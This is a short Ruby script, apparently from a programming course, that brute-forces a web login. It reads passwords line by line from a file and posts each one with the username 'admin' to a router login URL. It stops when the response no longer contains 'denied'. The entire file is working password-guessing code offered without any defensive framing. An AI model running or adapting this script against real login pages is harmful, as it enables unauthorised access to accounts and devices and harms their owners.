require 'net/http'
require 'uri'

def is_wrong_password? password
uri = URI.parse 'http://rubyschool.us/router'
response = Net::HTTP.post_form(uri, :login => "admin", :password => password).body
p response.include? "denied"
end

input = File.open "passwords.txt", "r"

while (line = input.gets)
  line.strip!
  p "Trying pass #{line}"
  if is_wrong_password? line
    p "Error"
  else
    p "OK"
    input.close
    exit
  end
end
